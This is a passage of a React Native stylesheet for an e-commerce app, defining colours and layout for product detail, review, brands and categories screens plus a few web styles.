    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 14,
    borderRadius: 20,
    gap: 8,
  },
  amazonAddToCartText: {
    color: '#FFF0F5',
    fontSize: 14,
    fontWeight: 'bold',
  },
  amazonBuyNowBtn: {
    flex: 1,
    backgroundColor: '#4169E1',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 14,
    borderRadius: 20,
  },
  amazonBuyNowText: {
    color: '#FFF0F5',
    fontSize: 14,
    fontWeight: 'bold',
  },
  amazonTabs: {
    flexDirection: 'row',
    borderBottomWidth: 1,
    borderBottomColor: '#e0e0e0',
    marginBottom: 20,
  },
  amazonTab: {
    flex: 1,
    paddingVertical: 12,
    alignItems: 'center',
  },
  amazonTabActive: {
    borderBottomWidth: 2,
    borderBottomColor: '#1E90FF',
  },
  amazonTabText: {
    fontSize: 14,
    color: '#4169E1',
  },
  amazonTabTextActive: {
    color: '#1E90FF',
    fontWeight: '600',
  },
  amazonTabContent: {
    marginBottom: 25,
  },
  amazonDescription: {
    fontSize: 14,
    color: '#1E90FF',
    lineHeight: 22,
    marginBottom: 10,
  },
  amazonReadMore: {
    color: '#1E90FF',
    fontSize: 14,
    marginBottom: 15,
  },
  amazonFeatures: {
    marginTop: 15,
  },
  amazonFeaturesTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 10,
  },
  amazonFeatureItem: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
    marginBottom: 8,
  },
  amazonFeatureText: {
    fontSize: 13,
    color: '#1E90FF',
  },
  amazonDetailsTable: {
    backgroundColor: '#fff',
    borderRadius: 8,
    overflow: 'hidden',
  },
  amazonDetailsRow: {
    flexDirection: 'row',
    paddingVertical: 12,
    paddingHorizontal: 15,
    borderBottomWidth: 1,
    borderBottomColor: '#e0e0e0',
  },
  amazonDetailsLabel: {
    width: '35%',
    fontSize: 13,
    color: '#4169E1',
  },
  amazonDetailsValue: {
    width: '65%',
    fontSize: 13,
    color: '#1E90FF',
  },
  amazonRatingSummary: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 20,
  },
  amazonRatingSummaryLeft: {
    alignItems: 'center',
  },
  amazonAvgRating: {
    fontSize: 36,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  amazonStarsLarge: {
    flexDirection: 'row',
    gap: 2,
    marginVertical: 5,
  },
  amazonTotalRatings: {
    fontSize: 12,
    color: '#4169E1',
  },
  amazonWriteReviewBtn: {
    paddingHorizontal: 15,
    paddingVertical: 8,
    borderWidth: 1,
    borderColor: '#ddd',
    borderRadius: 20,
  },
  amazonWriteReviewText: {
    fontSize: 13,
    color: '#1E90FF',
  },
  amazonReviewCard: {
    borderBottomWidth: 1,
    borderBottomColor: '#e0e0e0',
    paddingBottom: 15,
    marginBottom: 15,
  },
  amazonReviewHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 10,
    marginBottom: 8,
  },
  amazonReviewerName: {
    fontSize: 14,
    fontWeight: '600',
    color: '#1E90FF',
  },
  amazonVerifiedBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 4,
  },
  amazonVerifiedText: {
    fontSize: 11,
    color: '#4169E1',
  },
  amazonReviewStars: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 5,
    marginBottom: 8,
  },
  amazonReviewDate: {
    fontSize: 11,
    color: '#4169E1',
    marginLeft: 10,
  },
  amazonReviewTitle: {
    fontSize: 14,
    fontWeight: '600',
    color: '#1E90FF',
    marginBottom: 6,
  },
  amazonReviewComment: {
    fontSize: 13,
    color: '#1E90FF',
    lineHeight: 18,
    marginBottom: 8,
  },
  amazonHelpfulBtn: {
    alignSelf: 'flex-start',
  },
  amazonHelpfulText: {
    fontSize: 12,
    color: '#1E90FF',
  },
  amazonSeeMoreReviews: {
    alignItems: 'center',
    paddingVertical: 10,
  },
  amazonSeeMoreText: {
    color: '#1E90FF',
    fontSize: 13,
  },
  amazonRelatedSection: {
    marginTop: 20,
    marginBottom: 20,
  },
  amazonRelatedTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 15,
  },
  amazonRelatedScroll: {
    gap: 12,
    paddingRight: 16,
  },
  amazonRelatedCard: {
    width: 160,
    backgroundColor: '#fff',
    borderRadius: 8,
    padding: 10,
    borderWidth: 1,
    borderColor: '#e0e0e0',
  },
  amazonRelatedImage: {
    width: '100%',
    height: 140,
    resizeMode: 'contain',
    marginBottom: 8,
  },
  amazonRelatedName: {
    fontSize: 13,
    color: '#1E90FF',
    marginBottom: 5,
  },
  amazonRelatedPrice: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#4169E1',
    marginBottom: 5,
  },
  amazonStarsSmall: {
    flexDirection: 'row',
    gap: 1,
  },
  amazonDeliverySection: {
    backgroundColor: '#fff',
    borderRadius: 8,
    padding: 15,
    gap: 15,
    marginTop: 10,
  },
  amazonDeliveryRow: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 12,
  },
  amazonDeliveryTitle: {
    fontSize: 14,
    fontWeight: '500',
    color: '#1E90FF',
  },
  amazonDeliveryDesc: {
    fontSize: 12,
    color: '#4169E1',
    marginTop: 2,
  },

  // Mobile specific
  amazonMobileContainer: {
    flex: 1,
    backgroundColor: '#FFF0F5',
  },
  amazonMobileHeader: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    height: Platform.OS === 'ios' ? 90 : 70,
    backgroundColor: '#FFF0F5',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    paddingHorizontal: 15,
    paddingTop: Platform.OS === 'ios' ? 45 : 15,
    zIndex: 100,
    elevation: 5,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  amazonMobileBackBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  amazonMobileHeaderTitle: {
    fontSize: 16,
    fontWeight: '600',
    color: '#1E90FF',
    flex: 1,
    textAlign: 'center',
  },
  amazonMobileWishlistBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  amazonMobileScroll: {
    flex: 1,
    marginTop: Platform.OS === 'ios' ? 90 : 70,
    backgroundColor: '#FFF0F5',
  },

  // Brands Page Styles
  brandsContainer: {
    flex: 1,
    backgroundColor: '#FFF0F5',
  },
  brandsHeader: {
    backgroundColor: '#FFF0F5',
    borderBottomWidth: 1,
    borderBottomColor: '#f0f0f0',
    paddingTop: Platform.OS === 'ios' ? 10 : 15,
    elevation: 4,
  },
  brandsHeaderTop: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    paddingHorizontal: 16,
    paddingVertical: 12,
  },
  brandsBackBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  brandsTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  brandsHeaderActions: {
    flexDirection: 'row',
    gap: 12,
  },
  brandsSearchBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  brandsViewBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  brandsSearchContainer: {
    paddingHorizontal: 16,
    paddingBottom: 12,
  },
  brandsSearchBar: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#fff',
    borderRadius: 12,
    paddingHorizontal: 15,
    paddingVertical: 12,
    gap: 10,
  },
  brandsSearchInput: {
    flex: 1,
    fontSize: 16,
    color: '#1E90FF',
  },
  searchResultsCount: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginTop: 10,
    paddingHorizontal: 4,
  },
  searchResultsText: {
    fontSize: 13,
    color: '#4169E1',
  },
  clearFiltersText: {
    fontSize: 13,
    color: '#1E90FF',
    fontWeight: '500',
  },

  // Categories Page Styles
  categoriesContainer: {
    flex: 1,
    backgroundColor: '#FFF0F5',
  },
  categoriesHeader: {
    backgroundColor: '#FFF0F5',
    borderBottomWidth: 1,
    borderBottomColor: '#f0f0f0',
    paddingTop: Platform.OS === 'ios' ? 10 : 15,
  },
  categoriesHeaderTop: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    paddingHorizontal: 16,
    paddingVertical: 12,
  },
  categoriesBackBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  categoriesTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  categoriesHeaderActions: {
    flexDirection: 'row',
    gap: 12,
  },
  categoriesSearchBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  categoriesViewBtn: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#fff',
    justifyContent: 'center',
    alignItems: 'center',
  },
  categoriesSearchContainer: {
    paddingHorizontal: 16,
    paddingBottom: 12,
  },
  categoriesSearchBar: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#fff',
    borderRadius: 12,
    paddingHorizontal: 15,
    paddingVertical: 12,
    gap: 10,
  },
  categoriesSearchInput: {
    flex: 1,
    fontSize: 16,
    color: '#1E90FF',
  },
  
  // Popular Categories Section
  popularSection: {
    marginTop: 16,
    marginBottom: 24,
  },
  popularScroll: {
    paddingHorizontal: 16,
    gap: 12,
  },
  popularCard: {
    width: 140,
    height: 180,
    borderRadius: 16,
    overflow: 'hidden',
    position: 'relative',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  popularImage: {
    width: '100%',
    height: '100%',
    resizeMode: 'cover',
  },
  popularOverlay: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    backgroundColor: 'rgba(30,144,255,0.85)',
    padding: 12,
  },
  popularName: {
    color: '#FFF0F5',
    fontSize: 14,
    fontWeight: 'bold',
  },
  popularCount: {
    color: '#FFF0F5',
    fontSize: 11,
    marginTop: 4,
  },
  
  // All Categories Section
  allCategoriesSection: {
    paddingHorizontal: 16,
  },
  sectionHeader: {
    marginBottom: 16,
  },
  sectionTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  sectionSubtitle: {
    fontSize: 13,
    color: '#4169E1',
    marginTop: 4,
  },
  categoriesGridContainer: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    marginHorizontal: -8,
  },
  categoriesListContainer: {
    gap: 12,
  },
  
  // Category Card Styles
  categoryCard: {
    backgroundColor: '#fff',
    borderRadius: 16,
    overflow: 'hidden',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  categoryImageContainer: {
    position: 'relative',
  },
  categoryImage: {
    width: '100%',
    height: 140,
    resizeMode: 'cover',
  },
  categoryCountBadge: {
    position: 'absolute',
    top: 10,
    right: 10,
    backgroundColor: '#1E90FF',
    paddingHorizontal: 10,
    paddingVertical: 4,
    borderRadius: 12,
  },
  categoryCountText: {
    color: '#FFF0F5',
    fontSize: 12,
    fontWeight: 'bold',
  },
  categoryCardContent: {
    padding: 12,
  },
  categoryName: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 4,
  },
  categoryDescription: {
    fontSize: 12,
    color: '#4169E1',
    lineHeight: 16,
    marginBottom: 8,
  },
  categorySubcategoryRow: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 6,
    marginBottom: 10,
  },
  categorySubTag: {
    backgroundColor: '#FFF0F5',
    paddingHorizontal: 8,
    paddingVertical: 3,
    borderRadius: 10,
  },
  categorySubTagText: {
    fontSize: 10,
    color: '#1E90FF',
  },
  categoryMoreText: {
    fontSize: 10,
    color: '#4169E1',
    alignSelf: 'center',
  },
  categoryExploreBtn: {
    paddingVertical: 6,
  },
  categoryExploreText: {
    fontSize: 12,
    color: '#1E90FF',
    fontWeight: '600',
  },
  
  // Category List Item Styles
  categoryListItem: {
    flexDirection: 'row',
    backgroundColor: '#fff',
    borderRadius: 16,
    marginBottom: 12,
    padding: 12,
    elevation: 2,
  },
  categoryListImage: {
    width: 80,
    height: 80,
    borderRadius: 12,
    resizeMode: 'cover',
  },
  categoryListContent: {
    flex: 1,
    marginLeft: 12,
    justifyContent: 'space-between',
  },
  categoryListHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 8,
  },
  categoryListName: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  categoryListCount: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 4,
    backgroundColor: '#FFF0F5',
    paddingHorizontal: 8,
    paddingVertical: 2,
    borderRadius: 10,
  },
  categoryListCountText: {
    fontSize: 11,
    color: '#1E90FF',
  },
  categoryListDesc: {
    fontSize: 12,
    color: '#4169E1',
    lineHeight: 16,
    marginTop: 4,
  },
  categoryListSubs: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 6,
    marginTop: 8,
  },
  categoryListSubTag: {
    backgroundColor: '#FFF0F5',
    paddingHorizontal: 8,
    paddingVertical: 3,
    borderRadius: 10,
  },
  categoryListSubText: {
    fontSize: 10,
    color: '#1E90FF',
  },
  categoryListMore: {
    fontSize: 10,
    color: '#4169E1',
    alignSelf: 'center',
  },
  categoryListExplore: {
    fontSize: 11,
    color: '#1E90FF',
    marginTop: 8,
  },
  
  // Loading and Empty States
  categoriesLoadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#FFF0F5',
  },
  categoriesLoadingText: {
    marginTop: 16,
    fontSize: 16,
    color: '#1E90FF',
  },
  categoriesEmptyContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingVertical: 60,
  },
  categoriesEmptyTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginTop: 20,
    marginBottom: 10,
  },
  categoriesEmptyText: {
    fontSize: 14,
    color: '#4169E1',
    textAlign: 'center',
    marginBottom: 20,
  },
  categoriesEmptyButton: {
    backgroundColor: '#1E90FF',
    paddingHorizontal: 30,
    paddingVertical: 12,
    borderRadius: 25,
  },
  categoriesEmptyButtonText: {
    color: '#FFF0F5',
    fontSize: 16,
    fontWeight: '600',
  },
  alphabetScroll: {
    paddingHorizontal: 16,
    paddingVertical: 12,
    backgroundColor: '#fff',
  },
  alphabetContainer: {
    gap: 8,
  },
  alphabetItem: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#FFF0F5',
    justifyContent: 'center',
    alignItems: 'center',
  },
  alphabetItemActive: {
    backgroundColor: '#1E90FF',
  },
  alphabetItemDisabled: {
    opacity: 0.3,
  },
  alphabetText: {
    fontSize: 16,
    fontWeight: '600',
    color: '#1E90FF',
  },
  alphabetTextActive: {
    color: '#FFF0F5',
  },
  alphabetTextDisabled: {
    color: '#999',
  },
  brandsGridContainer: {
    padding: 8,
  },
  brandsListContainer: {
    padding: 12,
  },
  brandCard: {
    backgroundColor: '#fff',
    borderRadius: 16,
    overflow: 'hidden',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  brandImageContainer: {
    position: 'relative',
  },
  brandImage: {
    width: '100%',
    height: 150,
    resizeMode: 'cover',
  },
  brandRatingBadge: {
    position: 'absolute',
    top: 10,
    right: 10,
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(30,144,255,0.85)',
    paddingHorizontal: 8,
    paddingVertical: 4,
    borderRadius: 12,
    gap: 4,
  },
  brandRatingText: {
    color: '#FFF0F5',
    fontSize: 12,
    fontWeight: '600',
  },
  brandCardContent: {
    padding: 12,
  },
  brandName: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginBottom: 4,
  },
  brandProductsCount: {
    fontSize: 12,
    color: '#4169E1',
    marginBottom: 6,
  },
  brandDescription: {
    fontSize: 12,
    color: '#4169E1',
    lineHeight: 16,
    marginBottom: 10,
  },
  brandViewBtn: {
    paddingVertical: 8,
    paddingHorizontal: 0,
  },
  brandViewBtnText: {
    fontSize: 12,
    color: '#1E90FF',
    fontWeight: '600',
  },
  brandListItem: {
    flexDirection: 'row',
    backgroundColor: '#fff',
    borderRadius: 16,
    marginBottom: 12,
    padding: 12,
    elevation: 2,
  },
  brandListImage: {
    width: 80,
    height: 80,
    borderRadius: 12,
    resizeMode: 'cover',
  },
  brandListContent: {
    flex: 1,
    marginLeft: 12,
    justifyContent: 'space-between',
  },
  brandListHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  brandListName: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#1E90FF',
  },
  brandListRating: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 4,
  },
  brandListRatingText: {
    fontSize: 12,
    color: '#4169E1',
  },
  brandListDesc: {
    fontSize: 12,
    color: '#4169E1',
    lineHeight: 16,
    marginTop: 4,
  },
  brandListFooter: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginTop: 8,
  },
  brandListProducts: {
    fontSize: 11,
    color: '#4169E1',
  },
  brandListExplore: {
    fontSize: 12,
    color: '#1E90FF',
    fontWeight: '600',
  },
  brandsLoadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#FFF0F5',
  },
  brandsLoadingText: {
    marginTop: 16,
    fontSize: 16,
    color: '#1E90FF',
  },
  brandsEmptyContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 40,
  },
  brandsEmptyTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#1E90FF',
    marginTop: 20,
    marginBottom: 10,
  },
  brandsEmptyText: {
    fontSize: 14,
    color: '#4169E1',
    textAlign: 'center',
    marginBottom: 20,
  },
  brandsEmptyButton: {
    backgroundColor: '#1E90FF',
    paddingHorizontal: 30,
    paddingVertical: 12,
    borderRadius: 25,
  },
  brandsEmptyButtonText: {
    color: '#FFF0F5',
    fontSize: 16,
    fontWeight: '600',
  },
});

// Web styles
const stylesWeb = {
  amazonContainer: {
    height: '100vh',
    display: 'flex',
    flexDirection: 'column',
    backgroundColor: '#FFF0F5',
  },
  amazonStickyHeader: {
    position: 'sticky',
    top: 0,
    left: 0,
    right: 0,
    backgroundColor: '#FFF0F5',
    borderBottom: '1px solid #e0e0e0',
    padding: '12px 20px',
    display: 'flex',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    zIndex: 100,
  },
  amazonHeaderLeft: {
    width: 150,
  },
  amazonBackBtn: {
    background: 'none',
    border: 'none',
    color: '#1E90FF',
    fontSize: '14px',
    cursor: 'pointer',
    padding: '8px',
  },
  amazonHeaderCenter: {
    flex: 1,
    textAlign: 'center',
  },
  amazonLogo: {
    width: 100,
    height: 30,
    objectFit: 'contain',
  },
  amazonHeaderRight: {
    width: 150,
    textAlign: 'right',
  },
  amazonCartBtn: {
    background: 'none',
    border: 'none',
    color: '#1E90FF',
    fontSize: '14px',
    cursor: 'pointer',
    padding: '8px',
  },
  amazonScrollContent: {
    flex: 1,
    overflowY: 'auto',
    WebkitOverflowScrolling: 'touch',
    backgroundColor: '#FFF0F5',
  },
};